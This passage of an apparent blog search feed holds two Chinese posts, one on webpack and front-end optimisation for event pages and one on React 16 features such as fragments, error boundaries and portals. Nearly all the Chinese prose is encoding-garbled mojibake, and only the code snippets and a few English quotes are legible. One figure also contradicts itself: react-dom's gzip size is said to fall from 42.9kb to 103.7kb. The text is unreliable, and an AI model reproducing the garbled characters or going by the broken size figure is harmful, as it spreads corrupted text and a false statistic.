å›¾ç‰‡é—®é¢˜å›¾ç‰‡æ˜¯å‰ç«¯ä¸å¯å¿½è§†çš„é‡èµ„æºé—®é¢˜ï¼Œå°½ç®¡å›¾ç‰‡è§£ææ¸²æŸ“éå¸¸å¿«ï¼ˆç›¸æ¯”åŒç­‰å¤§å°çš„jsï¼‰ã€‚ä½†æ˜¯è¿‡å¤§çš„å›¾ç‰‡ä¼šå¯¼è‡´é¡µé¢æœ‰æ®µç©ºç™½æœŸï¼Œç”šè‡³å‡ºç°é¡µé¢æŠ–åŠ¨ï¼Œé€ æˆéå¸¸ç³Ÿç³•çš„ç”¨æˆ·ä½“éªŒã€‚ å¤§å›¾ç‰‡ ä½¿ç”¨ image-webpack-loader è¿›è¡Œå›¾ç‰‡çš„å‹ç¼© åœ¨ CDN ä¸Šå­˜å‚¨.png å’Œ .webp ä¸¤ç§æ ¼å¼çš„å›¾ç‰‡ï¼Œå®¢æˆ·ç«¯åˆ¤æ–­èƒ½ç”¨webp å°±ç”¨ webpï¼ˆåˆ¤æ–­æ˜¯å¦æ”¯æŒ webp éœ€è¦ä¸€å®šçš„æ—¶é—´ï¼Œå¯å°†åˆ¤æ–­ç»“æœæŒä¹…åŒ–å­˜å‚¨åœ¨æœ¬åœ°ï¼‰ï¼Œæˆ–è€…ç›´æ¥åœ¨ CDN å®ç°ã€‚å¦‚æœäº§å“è¿è¡Œåœ¨ webview å¯ä»¥å¼•å…¥åŸºç¡€åº“ï¼Œç›´æ¥å¯¹ webp è¿›è¡Œæ”¯æŒã€‚ å°å›¾æ ‡svg åœ¨ç§»åŠ¨ç«¯æ”¯æŒçš„éå¸¸å¥½äº†ï¼Œæ­é… http/2ï¼Œè·‘çš„é£èµ·ï¼Œæ²¡æœ‰ç†ç”±ä¸ç”¨ã€‚è™½ç„¶åœ¨ android &lt;= 4.3 ä¼šå°† svg è½¬æ¢æˆéçŸ¢é‡å›¾åœ¨æ¸²æŸ“ï¼Œä½†æ˜¯çœ‹çœ‹ä½ çš„åº”ç”¨åœ¨ android &lt;= 4.3 æœ‰å¤šå°‘ç”¨æˆ·é‡å§ã€‚ CSSç›´æ¥ä¸Š postcssï¼Œèƒ½å°† px è½¬æ¢æˆ remï¼Œèƒ½ autoprefixer(è¿˜èƒ½æ ¹æ®éœ€è¦å…¼å®¹çš„æµè§ˆå™¨è¿›è¡Œé…ç½®ï¼Œå½“ç„¶æ›´å¥½çš„æ–¹å¼æ˜¯ä½¿ç”¨ .browserslistrcï¼Œè¿™æ‰æ˜¯ä¸šç•Œæ ‡å‡†)ï¼Œèƒ½å‹ç¼© cssnanoã€‚ Normalize.css å½“ç„¶ä¸èƒ½å°‘normalize.css JSåŠ¨æ€ polyfillç”±äºå¤§éƒ¨åˆ†ç”¨æˆ·ç”¨çš„éƒ½æ˜¯â€œç°ä»£â€æ‰‹æœºï¼Œå› æ­¤å¤§éƒ¨åˆ† polyfill å¯¹äºå¤§éƒ¨åˆ†ç”¨æˆ·æ¥æ˜¯ä¸éœ€è¦çš„ã€‚å¯ä»¥è‡ªå·±æ­æœåŠ¡å™¨å®ç°ç±»ä¼¼ polyfill.io çš„åŠŸèƒ½ã€‚å…·ä½“æ€§èƒ½ä¼˜åŠ¿ï¼Œä¼ é€é—¨ ç¼–è¯‘æˆ es+åŒæ ·ï¼Œå¯¹äºå¤§éƒ¨åˆ†ç”¨æˆ·æ˜¯èƒ½è¿è¡Œ es6 çš„ï¼Œæ‰€ä»¥ä¸å¿…å°†æ‰€æœ‰ä»£ç ç¼–è¯‘æˆ es5ã€‚å¯ä»¥ç¼–è¯‘æˆä¸¤å¥—ä»£ç ï¼Œä¸€å¥— es6ï¼Œä¸€å¥— es5 ç”¨äºå…¼å®¹åº•ç«¯è®¾å¤‡ã€‚å…·ä½“æ–¹æ¡ˆï¼Œä¼ é€é—¨ Webpackä¸‹é¢é€šè¿‡ä»£ç ç›´æ¥åˆ†æé‡åˆ°çš„é—®é¢˜ã€‚ htmlç”±äºæˆ‘ä»¬çš„éœ€æ±‚æ¯”è¾ƒç®€å•ï¼Œä½¿ç”¨ html-webpack-plugin èƒ½è§£å†³æˆ‘ä»¬çš„å•é¡µå¤šé¡µé—®é¢˜ã€‚ å¤„ç† html é‡çš„å›¾ç‰‡ï¼š ä½¿ç”¨ html-loader html çƒ­æ›´æ–°ï¼Œåœ¨ entry æ–‡ä»¶ï¼ŒåŠ å…¥ï¼š 1234if (process.env.NODE_ENV === 'development') &#123; require('path/to/html')&#125; CSSç”±äºæˆ‘ä»¬æ˜¯æ´»åŠ¨é¡µï¼Œæ¯”è¾ƒé€‚åˆå°† css æ³¨å…¥ style æ ‡ç­¾ä¸­ï¼Œå®ç°æ–¹å¼å¦‚ä¸‹ï¼š mini-css-extract-plugin æå– css style-ext-html-webpack-plugin å°†æå–çš„ css æ³¨å…¥ html æ–‡ä»¶ âš ï¸ mini-css-extract-plugin æ’ä»¶è¦åœ¨ style-ext-html-webpack-plugin ä¹‹å‰ 123456789101112131415161718192021222324252627282930313233343536373839// æå–å¤šä¸ªæ–‡ä»¶ css çš„ webpack é…ç½®function generaterStyleChunk() &#123; const styleChunk = &#123;&#125;; for (let page of config.pages) &#123; styleChunk[page + 'style'] = &#123; name: page, test: (m,c,entry = page) =&gt; m.constructor.name === 'CssModule' &amp;&amp; recursiveIssuer(m) === entry, chunks: 'all', enforce: true &#125; &#125; return styleChunk;&#125;// éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸èƒ½å°† css æ‰“åŒ…è¿› js ä¸­&#123; optimization: &#123; minimize: true, runtimeChunk: 'single', splitChunks: &#123; cacheGroups: Object.assign(&#123; common: &#123; test(module, chunks) &#123; const result = module.type === 'javascript/auto' &amp;&amp; /\/node_modules\//.test(module.context); if (!result) &#123; console.log(module.type); console.log(module.context); &#125; return result; &#125;, name: 'common', chunks: 'initial', priority: 2, minChunks: 2, &#125; &#125;, generaterStyleChunk()) &#125; &#125;&#125; ä¿è¯chunk åå­—å˜åŠ¨æœ€å°123456789new webpack.NamedChunksPlugin((chunk) =&gt; &#123; const hashChunk = () =&gt; &#123; return md5(Array.from(chunk.modulesIterable, (m) =&gt; &#123; return m.identifier(); &#125;).join()).slice(0, 10); &#125; return chunk.name ? chunk.name : hashChunk() &#125;),new webpack.HashedModuleIdsPlugin(), å…¶ä»–é—®é¢˜æ”¯æŒ async/await éœ€è¦ @babel/plugin-transform-runtime åˆ†æä»£ç è¾“å‡º webpack-bundle-analyzer åˆ†æ babelï¼Œdebug: true æ€»ç»“ä½ éœ€è¦æ˜ç™½ï¼Œæƒ³è¦æ„å»ºæˆä»€ä¹ˆæ ·ï¼Œèƒ½ç”¨èµ„æºæœ‰å“ªäº›ï¼Œå¯ä»¥åšåˆ°ä»€ä¹ˆåœ°æ­¥ã€‚ç„¶åä¸€æ­¥æ­¥åˆ†æï¼Œå®ç°ä½ æƒ³è¦çš„æ¨¡æ ·ã€‚]]></content>
      <categories>
        <category>webpack</category>
      </categories>
      <tags>
        <tag>webpack</tag>
        <tag>æ´»åŠ¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react16 ç³»åˆ—ï¼ˆ1ï¼‰]]></title>
    <url>%2Freact16%20%E7%B3%BB%E5%88%97%EF%BC%881%EF%BC%89%20%2F</url>
    <content type="text"><![CDATA[å‰è¨€ è¿‘æ¥ä¸€ç›´å¿™å…¶ä»–äº‹ï¼Œæ²¡æ€ä¹ˆå’Œ react æ‰“è¿‡æ‹›å‘¼äº†ï¼Œè½¬çœ¼ react å·²ç»è·Ÿæ–°åˆ°äº† 16.2 ç‰ˆæœ¬ï¼Œå¹¶ä¸”å¸¦æ¥äº†å¾ˆå¤šé‡è¦çš„å˜æ›´: render å¯ä»¥è¿”å›å­—ç¬¦ä¸²ï¼ˆStringï¼‰å’Œç‰‡æ®µï¼ˆfragments) Error Boundary å¤„ç†é”™è¯¯ç»„ä»¶ Portals å°†ç»„ä»¶æ¸²æŸ“åˆ°å½“å‰ç»„ä»¶æ ‘å¤– æ”¯æŒè‡ªå®šä¹‰ DOM å±æ€§ setState ä¼ å…¥ null æ—¶ä¸ä¼šå‡ºå‘æ›´æ–° å‡å°‘æ–‡ä»¶å¤§å° ä¼˜åŒ–æœåŠ¡å™¨ç«¯æ¸²æŸ“æ–¹å¼ render å¯ä»¥è¿”å›å­—ç¬¦ä¸²ï¼ˆStringï¼‰å’Œç‰‡æ®µï¼ˆfragments) ç°åœ¨çš„ render æ–¹æ³•å¯ä»¥è¿”å›å­—ç¬¦ä¸²ï¼Œéå¸¸ç®€å•ï¼š 123const String = () =&gt; &#123; return "hello world";&#125; render è¿”å›ç‰‡æ®µï¼Œæ˜¯ä¸ªæ•°ç»„ç±»å‹ï¼Œhtml å…ƒç´ éœ€è¦å¸¦ä¸Š keyï¼Œï¼ˆå®˜æ–¹è¯´å¯èƒ½ä¹‹åä¸ç”¨å†å†™ key äº†ï¼Œå“‡èµæˆçš„ä¸¾ä¸ªæ‰‹ï¼‰ğŸ‘‹ï¼š 123456789export const FragmentDemo1 = () =&gt; &#123; return [ "Some Text.", &lt;h2 key="heading-1"&gt;A heading&lt;/h2&gt;, "More text.", &lt;h2 key="heading-2"&gt;Another heading&lt;/h2&gt;, "Even more text." ];&#125; react16.2 æ–°å‡ºäº†ä¸€ä¸ªè¯­æ³•ç³– Fragmentï¼Œå®˜æ–¹å®šä¹‰å¦‚ä¸‹ï¼š Fragments look like empty JSX tags. They let you group a list of children without adding extra nodes to the DOMï¼š 123456789render() &#123; return ( &lt;&gt; &lt;ChildA /&gt; &lt;ChildB /&gt; &lt;ChildC /&gt; &lt;/&gt; );&#125; ä¹Ÿå°±æ˜¯è¯´ç›¸å½“äºä¸€ä¸ªç©ºçš„ jsx æ ‡ç­¾ï¼Œå…·ä½“ç”¨æ³•ï¼š 1234567891011export const FragmentDemo2 = () =&gt; &#123; return ( &lt;Fragment&gt; Some text. &lt;h3&gt;A heading &lt;/h3&gt; More text. &lt;h1&gt;Another heading&lt;/h1&gt; Even more text. &lt;/Fragment&gt; );&#125; Error Boundary å¤„ç†é”™è¯¯ç»„ä»¶ åœ¨ UI ä¸­çš„ä¸€ä¸ª javascript é”™è¯¯ï¼Œä¸åº”è¯¥è®©æ•´ä¸ªåº”ç”¨å´©æºƒï¼Œåƒçš®çƒä¸€æ ·ï¼Œæ“ä¸ªæ´å°±ç‚¸äº†ã€‚ ä¸ºè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œreact16 æä¾›äº†ä¸€æ–°çš„æ¦‚å¿µ Error Boundaryï¼š å¯ä»¥æ•è·å®ƒçš„å­ç»„ä»¶æ ‘çš„ä»»ä½• javascript é”™ï¼Œlog é”™è¯¯ä¿¡æ¯ï¼Œå¹¶ç”¨ä¸€ä¸ª component å–ä»£å¥”æºƒçš„ç»„ä»¶æ ‘ã€‚åŒ…æ‹¬ rendering æ—¶çš„é”™è¯¯ï¼Œç”Ÿå‘½å‘¨æœŸä¸­çš„é”™è¯¯ï¼Œä»¥åŠå­ç»„ä»¶ä¸­çš„ constructor ä¸­é”™è¯¯ã€‚å¦‚æœ Error Boundary å¤„ç†å¤±è´¥ï¼Œä¼šä¸Šæµ®åˆ°ç¦»å®ƒæœ€è¿‘çš„ä¸€ä¸ª Error Boundary ä¸Šï¼Œç›¸ä¼¼äº catch {} æ³¨ï¼šæ˜¯åªèƒ½æ•è·å­ç»„ä»¶æ ‘ï¼Œä¸èƒ½æ•è·å®ƒè‡ªèº«çš„é”™è¯¯ã€‚ æ€ä¹ˆç”¨å‘¢ï¼Ÿåªéœ€è¦åœ¨ä¸€ä¸ª class Component åŠ ä¸Š componentDidCatchï¼Œè¿™ä¸ªç»„ä»¶å°±å˜æˆ Error Boundary Component äº† 12345678910111213141516171819class ErrorBoundary extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; hasError: false &#125;; &#125; componentDidCatch(error, info) &#123; // Dispay fallback UI this.setState(&#123; hasError: true &#125;); // You can also log the error to an error reporting servics // logErrorToMyServics(error, info); console.log(error, info); &#125; render() &#123; if (this.state.hasError) &#123; return &lt;h1&gt;Something went wrong.&lt;/h1&gt; &#125; return this.props.children; &#125;&#125; æ³¨ï¼šä¹Ÿåªæœ‰ class Compoent æ‰èƒ½å˜æˆ Error Boundary Component ç„¶åå¯ä»¥ç”¨äºæ™®é€šç»„ä»¶ï¼š 123&lt;ErrorBoundary&gt; &lt;String /&gt;&lt;/ErrorBoundary&gt; 1234const String = () =&gt; &#123; throw new Error('å“‡å“‡å“‡ï¼Œå‡ºé”™å•¦å‡ºé”™å•¦') return "hello world";&#125; ç°åœ¨æˆ‘ä»¬äº†è§£äº† Error Boundary çš„ä½œç”¨åŠå…¶ç”¨æ³•ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥ç”¨åœ¨å“ªé‡Œå‘¢ï¼Ÿ è¿™ä¸»è¦å–å†³äºä½ éœ€è¦åšå¤šç»†ç²’åº¦çš„æ§åˆ¶ã€‚å¯ä»¥ç”¨äºåŒ…è£¹é¡¶å±‚ route componentï¼Œå½“åº”ç”¨å‘ç”Ÿé”™è¯¯çš„æ—¶å€™ç°å® â€œå‡ºç°äº†æŸç§ç±»å‹çš„é”™è¯¯â€ ç»™ç”¨æˆ·ã€‚æˆ–è€…ä¸“é—¨æ§åˆ¶ä¸€äº›å°çš„å­ç»„ä»¶ï¼Œé˜²æ­¢å­ç»„ä»¶å¥”æºƒçš„æ—¶å€™å½±å“æ•´ä¸ªåº”ç”¨ã€‚ æ³¨ï¼šå¦‚æœæ²¡ä½¿ç”¨ Error Boundaryï¼Œå‡ºç°é”™è¯¯ï¼Œreact ä¼šå¸è½½æ•´ä¸ªç»„ä»¶æ ‘ï¼Œè¯¦ç»†åŸå› çœ‹ä¼ é€é—¨ Portals å°†ç»„ä»¶æ¸²æŸ“åˆ°å½“å‰ç»„ä»¶æ ‘å¤– ä½¿ç”¨ react çš„æ—¶å€™ï¼Œå¦‚æœæˆ‘æƒ³åœ¨çˆ¶ç»„ä»¶ä¸º overflow: hidden çš„æƒ…å†µä¸‹æŠŠå­ç»„ä»¶æ˜¾ç¤ºå‡ºæ¥æ€ä¹ˆåŠï¼Ÿä¾‹å¦‚ html5.2 æ–°å‡ºçš„ dialogï¼Œæˆ–è€…hovercardsã€tooltips Portals å°±æ˜¯ä¸ºè§£å†³è¿™ç§é—®é¢˜è€Œå¼€å‘å‡ºæ¥ï¼Œå®ƒå¯ä»¥å°†ä¸€ä¸ªç»„ä»¶æ¸²æŸ“åˆ°å…¶ä»– DOM èŠ‚ç‚¹å»ï¼Œè€Œä¸åœ¨å½“å‰çš„çˆ¶èŠ‚ç‚¹ä¸‹ï¼Œç”¨æ³•å¦‚ä¸‹ï¼š 12345678render() &#123; // React does *not* create a new div. It renders the children into `domNode`. // `domNode` is any valid DOM node, regardless of its location in the DOM. return ReactDOM.createPortal( this.props.children, domNode, );&#125; æ³¨ï¼šè™½ç„¶ Portal ç»„ä»¶æ¸²æŸ“åˆ°å…¶ä»– DOM èŠ‚ç‚¹ä¸‹äº†ï¼Œä½†æ˜¯ Portal ç»„ä»¶çš„å…¶ä»–æ–¹é¢çš„è¡Œä¸ºè¿˜æ˜¯å’Œæ­£å¸¸çš„ react child ä¸€æ ·ï¼ŒPortal ç»„ä»¶ä¸Šçš„äº‹ä»¶è¿˜æ˜¯ä¼ é€’åˆ°åŸæ¥çš„çˆ¶ç»„ä»¶ï¼Œè¿™å’Œ react çš„äº‹ä»¶ç³»ç»Ÿè®¾è®¡æœ‰å…³ï¼Œä¼ é€é—¨ æ”¯æŒè‡ªå®šä¹‰ DOM å±æ€§ å¬è¯´ react16 æ–‡ä»¶å‡å°ï¼Œæ˜¯ä¸æ˜¯å¾ˆå¼€å¿ƒğŸ˜„ï¼Ÿ ä½†æ˜¯è¿™å’Œæˆ‘ä»¬çš„è‡ªå®šä¹‰ DOM å±æ€§æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿ å› ä¸º react ä¸ç”¨å†æä¸€ä¸ªå±æ€§ç™½åå•äº†ï¼Œç›´æ¥æŠŠæ— æ³•è¯†åˆ«çš„ html å’Œ svg å±æ€§ä¼ é€’ç»™ DOMï¼š 1&lt;div nirenshiwoma="ä¸è®¤è¯†ä½ è¿™ä¸ªå±æ€§è€¶"&gt;æˆ‘å¸¦äº†æ–°å±æ€§&lt;/div&gt; setState ä¼ å…¥ null æ—¶ä¸ä¼šå‡ºå‘æ›´æ–° setState react å®˜æ–¹æè¿°å¦‚ä¸‹ï¼š Calling setState with null no longer triggers an update. This allows you to decide in an updater function if you want to re-render. Calling setState directly in render always causes an update. This was not previously the case. Regardless, you should not be calling setState from render. setState callbacks (second argument) now fire immediately after componentDidMount / componentDidUpdate instead of after all components have rendered. è¿™é‡Œç‚¹å‡» update æŒ‰é’®ä¸ä¼šè§¦å‘ render: å‡å°‘æ–‡ä»¶å¤§å° ä»€ä¹ˆï¼Ÿå¢åŠ äº†è¿™ä¹ˆå¤šåŠŸèƒ½ï¼Œæ–‡ä»¶è¿˜å‡å°äº†ï¼Ÿã€æˆé¾™è„¸ã€‘ æ²¡é”™ï¼Œä½ æ²¡å¬é”™ï¼Œå¦‚ Facebook å·¥ç¨‹å¸ˆæ‰€è¯´ï¼šæˆ‘ä»¬å¯¹ react è¿›è¡Œäº†é‡å†™ èµï¼Œå–œæ¬¢çš„å°±æ˜¯è¿™èŒƒğŸ‘ reactåŒ…çš„å¤§å°ä»20.7kbä¸‹é™åˆ°5.3kbï¼ˆgzipå‹ç¼©åå¤§å°ä»6.9kbä¸‹é™åˆ°2.2kbï¼‰ã€‚ react-domåŒ…çš„å¤§å°ä»141kbä¸‹é™åˆ°103.7kbï¼ˆgzipå‹ç¼©åå¤§å°ä»42.9kbä¸‹é™åˆ°103.7kbï¼‰ã€‚ react+react-domåŒ…æ€»å¤§å°ä»161.7kbä¸‹é™åˆ°109kbï¼ˆgzipå‹ç¼©åå¤§å°ä»49.8kbä¸‹é™åˆ°34.8kbï¼‰ ä¼˜åŒ–æœåŠ¡å™¨ç«¯æ¸²æŸ“æ–¹å¼ è¿™ä¸ªæ˜¯å¤§è¯é¢˜ï¼Œè¯·å¬ä¸‹å›ã€react16 ç³»åˆ—ï¼ˆ2ï¼‰ã€‘åˆ†æğŸ˜Š]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>react16</tag>
      </tags>
  </entry>
</search>
